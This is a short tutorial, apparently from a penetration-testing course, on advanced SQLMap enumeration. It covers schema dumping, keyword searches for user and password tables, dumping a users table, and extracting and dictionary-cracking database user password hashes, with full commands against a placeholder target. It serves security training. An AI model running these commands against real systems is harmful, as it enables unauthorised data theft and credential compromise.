# Advanced Database Enumeration

Now that we have covered the basics of database enumeration with SQLMap, we will cover more advanced techniques to enumerate data of interest further in this section.

## DB Schema Enumeration

If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

This command displays all tables with their columns and data types across databases.

## Searching for Data

When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest using the `--search` option.

**Search for tables by keyword:**
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

**Search for columns by keyword:**
```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

## Password Enumeration and Cracking

Once you identify a table containing passwords, retrieve it with the `--dump` option:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

SQLMap automatically:
- Recognizes password hashes
- Offers dictionary-based cracking
- Supports 31 hash algorithm types
- Uses a dictionary with 1.4 million entries

## DB Users Password Enumeration

To dump database credentials from system tables, use the `--passwords` switch:

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

SQLMap will attempt to crack database user passwords using dictionary-based attacks.

**Tip:** Use `--all` with `--batch` to automatically enumerate the entire target database.
